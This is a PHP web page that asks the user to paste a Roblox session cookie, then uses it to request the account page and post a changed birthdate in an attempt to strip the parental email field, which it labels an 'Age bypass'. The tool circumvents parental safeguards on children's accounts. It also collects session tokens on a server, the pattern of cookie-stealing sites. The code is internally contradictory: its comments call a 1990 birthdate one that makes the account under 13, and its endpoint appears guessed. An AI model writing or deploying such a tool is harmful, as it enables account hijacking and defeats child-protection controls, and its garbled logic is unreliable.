<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cookie = $_POST["cookie"];
    
    if (empty($cookie)) {
        die("Invalid cookie provided.");
    }
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/my/account");
    curl_setopt($ch, CURLOPT_COOKIE, "ROBLOSECURITY=$cookie");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (strpos($response, "Parent's Email") !== false) {
        // Age is still over 13, attempt to change birthdate
        $newBirthdate = "1990-01-01"; // Set a birthdate that makes the account under 13
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/my/account");
        curl_setopt($ch, CURLOPT_COOKIE, "ROBLOSECURITY=$cookie");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "birthdate=$newBirthdate");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
        
        if (strpos($response, "Parent's Email") === false) {
            echo "Age bypass successful. Parental email field removed.";
        } else {
            echo "Failed to bypass age restriction.";
        }
    } else {
        echo "Parental email field already removed.";
    }
} else {
    ?>
    <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <label for="cookie">Roblox Cookie:</label><br>
        <input type="text" id="cookie" name="cookie" required><br>
        <input type="submit" value="Bypass Age">
    </form>
    <?php
}
?>
